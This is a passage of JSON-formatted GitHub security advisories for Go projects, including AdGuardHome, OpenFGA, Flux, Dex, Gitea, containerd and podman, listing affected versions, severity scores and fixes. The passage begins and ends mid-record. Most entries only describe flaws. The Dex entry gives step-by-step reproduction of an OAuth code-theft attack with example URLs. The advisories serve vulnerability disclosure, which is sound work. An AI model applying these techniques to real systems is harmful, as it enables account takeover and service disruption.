"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/AdguardTeam/AdGuardHome"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.95"}, {"fixed": "0.108.0-b.16"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32175"}, {"type": "WEB", "url": "https://github.com/AdguardTeam/AdGuardHome/commit/756b14a61de138889130c239406dae43f1f115cb"}, {"type": "PACKAGE", "url": "https://github.com/AdguardTeam/AdGuardHome"}, {"type": "WEB", "url": "https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.13/internal/home/controlfiltering.go#L265"}, {"type": "WEB", "url": "https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.15/internal/home/controlfiltering.go"}, {"type": "WEB", "url": "https://github.com/AdguardTeam/AdGuardHome/blob/v0.108.0-b.16/internal/home/controlfiltering.go"}, {"type": "WEB", "url": "https://www.mend.io/vulnerability-database/CVE-2022-32175"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-11T21:25:02Z", "nvd_published_at": "2022-10-11T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-95x7-mh78-7w2r", "modified": "2022-10-27T18:35:10Z", "published": "2022-10-25T20:13:38Z", "aliases": ["CVE-2022-39340"], "summary": "OpenFGA subject to Information Disclosure via streamed-list-objects endpoint", "details": "### Overview\nDuring our internal security assessment, it was discovered that `streamed-list-objects` endpoint was not validating the authorization header resulting in the disclosure of objects in the store.\n\n### Am I Affected?\nYou are affected by this vulnerability if you are using `openfga/openfga` version `v0.2.3` or prior and you are exposing the OpenFGA service to the internet.\n\n### How to fix that?\nUpgrade to version `v0.2.4`.\n\n### Backward Compatibility\nThis update is backward compatible.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.2.3"}}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-95x7-mh78-7w2r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39340"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/commit/779d73d4b6d067ee042ec9b59fec707eed71e42f"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v0.2.4"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-862", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-25T20:13:38Z", "nvd_published_at": "2022-10-25T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f4p5-x4vc-mh4v", "modified": "2023-02-14T21:24:24Z", "published": "2022-10-19T18:40:02Z", "aliases": ["CVE-2022-39272"], "summary": "Improper use of metav1.Duration allows for Denial of Service", "details": "Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux\u2019s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields `.spec.interval` or `.spec.timeout` (and structured variations of these fields), causing the entire object type to stop being processed.\n\nThe issue has two root causes: a) the Kubernetes type `metav1.Duration` not being fully compatible with the Go type `time.Duration` as explained on [upstream report](https://github.com/kubernetes/apimachinery/issues/131); b) lack of validation within Flux to restrict allowed values.\n\n### Workarounds\n\nAdmission controllers can be employed to restrict the values that can be used for fields `.spec.interval` and `.spec.timeout`, however upgrading to the latest versions is still the recommended mitigation.\n\n### Credits\n\nThis issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as [recommended](https://fluxcd.io/security/#report-a-vulnerability)).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in any of the affected repositories.\n- Contact us at the CNCF Flux channel.\n\n### References\n\n- https://github.com/kubernetes/apimachinery/issues/131\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/flux2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "0.35.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/source-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.1-alpha-1"}, {"fixed": "0.30.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/kustomize-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.1-alpha-1"}, {"fixed": "0.29.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/helm-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.1-alpha-1"}, {"fixed": "0.24.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/notification-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.1-alpha-1"}, {"fixed": "0.27.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/image-automation-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "0.26.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/image-reflector-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "0.22.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39272"}, {"type": "WEB", "url": "https://github.com/kubernetes/apimachinery/issues/131"}, {"type": "WEB", "url": "https://github.com/fluxcd/helm-controller/pull/533"}, {"type": "WEB", "url": "https://github.com/fluxcd/image-automation-controller/pull/439"}, {"type": "WEB", "url": "https://github.com/fluxcd/image-reflector-controller/pull/314"}, {"type": "WEB", "url": "https://github.com/fluxcd/kustomize-controller/pull/731"}, {"type": "WEB", "url": "https://github.com/fluxcd/notification-controller/pull/420"}, {"type": "WEB", "url": "https://github.com/fluxcd/source-controller/pull/903"}, {"type": "PACKAGE", "url": "https://github.com/fluxcd/flux2"}, {"type": "WEB", "url": "https://github.com/kubernetes/apimachinery#131"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1071"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-19T18:40:02Z", "nvd_published_at": "2022-10-22T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vh7g-p26c-j2cw", "modified": "2023-07-12T14:01:57Z", "published": "2022-10-03T19:12:03Z", "aliases": ["CVE-2022-39222"], "summary": "Dex vulnerable to Man-in-the-Middle allowing ID token capture via intercepted authorization code", "details": "### Impact\nDex instances with public clients (and by extension, clients accepting tokens issued by those Dex instances) are affected by this vulnerability.\n\nAn attacker can exploit this vulnerability by making a victim navigate to a malicious website and guiding them through the OIDC flow, stealing the OAuth authorization code in the process. The authorization code then can be exchanged by the attacker for a token, gaining access to applications accepting that token.\n\n### Steps to reproduce\n\n1) A victim navigates to a malicious website\n\n2) The webserver initiates a connection with a Dex instance directly - https://dexexample.com/auth/https:%252F%252Faccounts.google.com?access_type=online&client_id=example&nonce=2AaJAimQU9CbeOFsNra1d7CJTWB&redirect_uri=http%3A%2F%2Flocalhost%3A40393%2Fauth%2Fcallback&response_type=code&scope=openid+email&state=2AaJAjhpUmsB25csCo5muvorMTl. In this example, the Dex instance is hosted on `dexexample.com`, and the connector is `accounts.google.com`.\n\n3) Dex returns a 302 Redirect to the connector IDP, https://accounts.google.com/o/oauth2/v2/auth?client_id=237800849078-hri2ndt7gdafpf34kq8crd5sik9pe3so.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fdexexample.com%2Fauth%2Fcallback&response_type=code&scope=openid+email&state=g3dkmpontsr3ugocoddjx72ef. The attacker records the state parameter value g3dkmpontsr3ugocoddjx72ef which will be used as the request ID later on.\n\n4) The malicious website redirects the victim\u2019s browser to the connector IDP.\n\n5) The user authenticates to the connector IDP. If they have authenticated before, they may not be presented with an authentication challenge. The user will silently be taken through the following steps:\n\n    Authentication with the connector IDP, which redirects the browser to the Dex callback with a code - https://dexexample.com/callback?state=g3dkmpontsr3ugocoddjx72ef&code=4%2F0AX4XfWizg1PQEQNl18hmP0_YQ3iUYII2ed13n9ikKr_ZcV7uCZpZaPcIlxBzX5QwFIcs-w&scope=email+openid+https%3A%2F%[2Fwww.googleapis.com](http://2fwww.googleapis.com/)%2Fauth%2Fuserinfo.email&authuser=0&hd=[google.com](http://google.com/)&prompt=none\n\n    Dex handles the callback, fetching the user claims from the connector IDP, persisting them and generating an OAuth code. Then Dex redirects the browser to the approval endpoint https://dexexample.com/approval?req=g3dkmpontsr3ugocoddjx72ef. Note that the req parameter is the same as the attacker's recorded state parameter.\n\n    Dex uses the request ID to look up the OAuth code, and builds a redirect to the original callback with the code - http://localhost:40393/auth/callback?code=bz5p3oov2wlh5k3rboa4atxas&state=2AaJAjhpUmsB25csCo5muvorMTl.\n\n\nIn step 2., when the webserver initiates the connection to Dex and receives the redirect to the connector IDP, the webserver will persist the connector state parameter (`g3dkmpontsr3ugocoddjx72ef`), which is used as the request ID to later look up the OAuth code. As the user goes through the authentication flow with the connector IDP, the webserver will repeatedly request `/approval?req=<state>`. Once the user has successfully authenticated, if the webserver is able to call /approval before the victim\u2019s browser calls `/approval`, then an attacker can fetch the Dex OAuth code which can be exchanged for an ID token using the `/token` endpoint.\n\nNote that PKCE does not defend against this attack since the webserver initiates the request to Dex with a known code challenge.\n\n### Fix\n\nThe request has been made unpredictable with message authentication. This was accomplished by creating an [HMAC](https://en.wikipedia.org/wiki/HMAC) using a randomly generated per-request secret. This secret is persisted between the initial login request and the approval request. Since the HMAC is derived using a secret key, its value cannot be known to an attacker, so they will be unable to poll `/approval` for the code.\n\n### Patches\nUpdate to 2.35.0.\n\n### Workarounds\nNo known workarounds (without impacting behavior) for existing versions.\n\nDisabling public clients is the only way to defend against attacks exploiting this vulnerability.\n\n### References\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Start a new [discussion](https://github.com/dexidp/dex/discussions/new?category=q-a)\n* Email us at [cncf-dex-maintainers@lists.cncf.io](mailto:cncf-dex-maintainers@lists.cncf.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dexidp/dex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.35.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.34.0"}}], "references": [{"type": "WEB", "url": "https://github.com/dexidp/dex/security/advisories/GHSA-vh7g-p26c-j2cw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39222"}, {"type": "WEB", "url": "https://github.com/dexidp/dex/commit/49471b14c8080ddb034d4855841123d378b7a634"}, {"type": "PACKAGE", "url": "https://github.com/dexidp/dex"}, {"type": "WEB", "url": "https://github.com/dexidp/dex/releases/tag/v2.35.0"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-862"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-03T19:12:03Z", "nvd_published_at": "2022-10-06T18:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xqv2-3vvq-qg6r", "modified": "2022-10-31T19:22:54Z", "published": "2022-10-27T19:00:38Z", "aliases": ["CVE-2022-36182"], "summary": "Hashicorp Boundary vulnerable to clickjacking", "details": "Hashicorp Boundary is vulnerable to Clickjacking which allow for the interception of login credentials, re-direction of users to malicious sites, or causing users to perform malicious actions on the site.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/boundary"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.11.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36182"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/boundary"}, {"type": "WEB", "url": "https://owasp.org/www-community/attacks/Clickjacking"}, {"type": "WEB", "url": "https://packetstormsecurity.com/files/168654/Hashicorp-Boundary-Clickjacking.html"}], "database_specific": {"cwe_ids": ["CWE-1021"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-28T19:18:55Z", "nvd_published_at": "2022-10-27T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pmw9-567p-68pc", "modified": "2023-10-02T11:15:21Z", "published": "2022-10-31T18:45:43Z", "aliases": ["CVE-2022-3616"], "summary": "OctoRPKI crashes when max iterations is reached", "details": "### Impact\nAttackers can create long chains of CAs that would lead to OctoRPKI exceeding its max iterations parameter. In consequence it would cause the program to crash, preventing it from finishing the validation and leading to a denial of service. Credits to Donika Mirdita and Haya Shulman - Fraunhofer SIT, ATHENE, who discovered and reported this vulnerability.\n\n### Specific Go Packages Affected\ngithub.com/cloudflare/cfrpki/cmd/octorpki\n\n### Patches\nThis issue is fixed in v1.4.4\n\n### Workarounds\nNone.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.4.3"}}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-pmw9-567p-68pc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3616"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/5f64bcd13477b29cd7ddff6fff3c65dfac3423ca"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}], "database_specific": {"cwe_ids": ["CWE-754", "CWE-834"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-31T18:45:43Z", "nvd_published_at": "2022-10-28T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w8xw-7crf-h23x", "modified": "2022-10-21T16:07:23Z", "published": "2022-10-16T12:00:23Z", "aliases": ["CVE-2022-42968"], "summary": "Gitea vulnerable to Argument Injection", "details": "Gitea before 1.17.3 does not sanitize and escape refs in the git backend. Arguments to git commands are mishandled.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.17.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-42968"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/21463"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.17.3"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202210-14"}], "database_specific": {"cwe_ids": ["CWE-88"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-21T16:07:23Z", "nvd_published_at": "2022-10-16T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9rpw-2h95-666c", "modified": "2023-10-02T11:20:15Z", "published": "2022-10-01T15:52:23Z", "aliases": ["CVE-2022-2529"], "summary": "Cloudflare GoFlow vulnerable to a Denial of Service in the sflow packet handling package", "details": "### Impact\nThe sflow decode package prior to version 3.4.4 does not employ sufficient packet sanitisation which can lead to a denial of service attack. Attackers can craft malformed packets causing the process to consume huge amounts of memory resulting in a denial of service.\n\n### Specific Go Packages Affected\ngithub.com/cloudflare/goflow/v3/decoders/sflow\n\n### Patches\nVersion 3.4.4 contains patches fixing this.\n\n### Workarounds\nA possible workaround is to not have your goflow collector publicly reachable.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [goflow repo](https://github.com/cloudflare/goflow)\n* Email us [netdev[@]cloudflare.com ](mailto:netdev@cloudflare.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/goflow/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.4.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/goflow/security/advisories/GHSA-9rpw-2h95-666c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2529"}, {"type": "WEB", "url": "https://github.com/cloudflare/goflow/commit/2b94619a6204443e3ca1769f4e459f9f57039c51"}, {"type": "WEB", "url": "https://github.com/cloudflare/goflow/commit/c829ccd2c0aafdc9b886b20bf6f28095607f4998"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/goflow"}, {"type": "WEB", "url": "https://github.com/cloudflare/goflow/releases/tag/v3.4.4"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-01T15:52:23Z", "nvd_published_at": "2022-09-30T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4993-m7g5-r9hh", "modified": "2022-10-06T23:14:23Z", "published": "2022-10-06T23:14:23Z", "aliases": ["CVE-2020-15115"], "summary": "etcd has no minimum password length", "details": "### Vulnerability type\nAccess Control\n\n### Workarounds\nThe etcdctl and etcd API do not enforce a specific password length during user creation or user password update operations. [It is the responsibility of the administrator to enforce these requirements](https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/authentication.md#notes-on-password-strength).\n\n### Detail\netcd does not perform any password length validation, which allows for very short passwords, such as those with a length of one. This may allow an attacker to guess or brute-force users\u2019 passwords with little computational effort.\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/client/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.4.0"}, {"fixed": "3.4.10"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/client/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.3.23"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-4993-m7g5-r9hh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15115"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/"}], "database_specific": {"cwe_ids": ["CWE-521"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-06T23:14:23Z", "nvd_published_at": "2020-08-06T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jcxc-rh6w-wf49", "modified": "2022-01-05T18:09:47Z", "published": "2022-01-06T21:36:19Z", "aliases": ["CVE-2021-23772"], "summary": "Link Following in Iris", "details": "This affects all versions of package github.com/kataras/iris; all versions of package github.com/kataras/iris/v12. The unsafe handling of file names during upload using UploadFormFiles method may enable attackers to write to arbitrary locations outside the designated target folder.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kataras/iris/v12"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "12.2.0-alpha8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kataras/iris"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23772"}, {"type": "WEB", "url": "https://github.com/kataras/iris/commit/e213dba0d32ff66653e0ef124bc5088817264b08"}, {"type": "PACKAGE", "url": "https://github.com/kataras/iris"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0272"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKATARASIRIS-2325169"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKATARASIRISV12-2325170"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-05T18:09:47Z", "nvd_published_at": "2021-12-24T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mvff-h3cj-wj9c", "modified": "2022-04-04T20:40:33Z", "published": "2022-01-06T17:36:59Z", "aliases": ["CVE-2021-43816"], "summary": "Unprivileged pod using `hostPath` can side-step active LSM when it is SELinux", "details": "### Impact\n\nContainers launched through containerd\u2019s CRI implementation on Linux systems which use the SELinux security module and containerd versions since v1.5.0 can cause arbitrary files and directories on the host to be relabeled to match the container process label through the use of specially-configured bind mounts in a hostPath volume. This relabeling elevates permissions for the container, granting full read/write access over the affected files and directories. Kubernetes and crictl can both be configured to use containerd\u2019s CRI implementation.\n\nIf you are not using containerd\u2019s CRI implementation (through one of the mechanisms described above), you are not affected by this issue.\n\n### Patches\n\nThis bug has been fixed in containerd 1.5.9.  Because file labels persist independently of containerd, users should both update to these versions as soon as they are released and validate that all files on their host are correctly labeled.\n\n### Workarounds\n\nEnsure that no sensitive files or directories are used as a hostPath volume source location.  Policy enforcement mechanisms such a Kubernetes Pod Security Policy [AllowedHostPaths](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems) may be specified to limit the files and directories that can be bind-mounted to containers.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-mvff-h3cj-wj9c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43816"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/issues/6194"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/a731039238c62be081eb8c31525b988415745eea"}, {"type": "WEB", "url": "https://github.com/dweomer/containerd/commit/f7f08f0e34fb97392b0d382e58916d6865100299"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GD5GH7NMK5VJMA2Y5CYB5O5GTPYMWMLX/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MPDIZMI7ZPERSZE2XO265UCK5IWM7CID/"}], "database_specific": {"cwe_ids": ["CWE-281"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-01-05T21:09:16Z", "nvd_published_at": "2022-01-05T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vc3p-29h2-gpcp", "modified": "2023-02-08T00:37:41Z", "published": "2022-01-02T00:00:48Z", "aliases": ["CVE-2021-44716"], "summary": "golang.org/x/net/http2 allows uncontrolled memory consumption", "details": "net/http in Go before 1.16.12 and 1.17.x before 1.17.5 allows uncontrolled memory consumption in the header canonicalization cache via HTTP/2 requests.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net/http2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20211209124913-491a49abca63"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44716"}, {"type": "WEB", "url": "https://go.dev/cl/369794"}, {"type": "WEB", "url": "https://go.dev/issue/50058"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/hcmEScgc00k"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2022/01/msg00016.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2022/01/msg00017.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0288"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-02"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220121-0002/"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:37:41Z", "nvd_published_at": "2022-01-01T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3cf2-x423-x582", "modified": "2022-02-09T18:28:05Z", "published": "2022-01-06T21:12:50Z", "aliases": ["CVE-2021-4024"], "summary": "Exposure of Sensitive Information to an Unauthorized Actor and Origin Validation Error in podman", "details": "A flaw was found in podman. The `podman machine` function (used to create and manage Podman virtual machine containing a Podman process) spawns a `gvproxy` process on the host system. The `gvproxy` API is accessible on port 7777 on all IP addresses on the host. If that port is open on the host's firewall, an attacker can potentially use the `gvproxy` API to forward ports on the host to ports in the VM, making private services on the VM accessible to the network. This issue could be also used to interrupt the host's services by forwarding all ports to the VM.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.4.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4024"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2026675,"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "https://github.com/containers/podman/releases/tag/v3.4.3"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QFFVJ6S3ZRMPDYB7KYAWEMDHXFZYQPU3/"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-346"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-01-05T17:44:04Z", "nvd_published_at": "2021-12-23T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mh3m-8c74-74xh", "modified": "2022-01-31T21:59:33Z", "published": "2022-01-27T15:28:06Z", "aliases": ["CVE-2022-21708"], "summary": "Denial of Service in graphql-go", "details": "### Impact\nThis is a DoS vulnerability that is possible due to a bug in the library that would allow an attacker with specifically designed queries to cause stack overflow panics. Any user with access to the GraphQL handler can send these queries and cause stack overflows. This in turn could potentially compromise the ability of the server to serve data to its users. To make things worse the only mitigation in affected versions creates opportunities for other attacks. This issue is only available if you are using `graphql.MaxDepth` option in your schema (which is highly recommended in most cases).\n\n### Patches\nThe issue has been patched in version `v1.3.0`. We have been trying to maintain backwards compatibility and avoid breaking changes so upgrading should not be problematic. \n\n### Workarounds\nThe best workaround is to patch to a version greater than or equal to `v1.3.0`. \nOtherwise, the only workaround in versions prior to `v1.3.0` is to disable the `graphql.MaxDepth` option from your schema. Unfortunately, this could potentially create opportunities for other attacks.\n\n### References\nThere are no references or links. This issue was reported privately and was fixed before creating this Security Advisory.\n\n### For more information\nIf you have any questions or comments feel free to reach out to @pavelnikolov or @tony on the Gopher Slack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/graph-gophers/graphql-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/graph-gophers/graphql-go/security/advisories/GHSA-mh3m-8c74-74xh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21708"}, {"type": "WEB", "url": "https://github.com/graph-gophers/graphql-go/commit/eae31ca73eb3473c544710955d1dbebc22605bfe"}, {"type": "PACKAGE", "url": "https://github.com/graph-gophers/graphql-go"}, {"type": "WEB", "url": 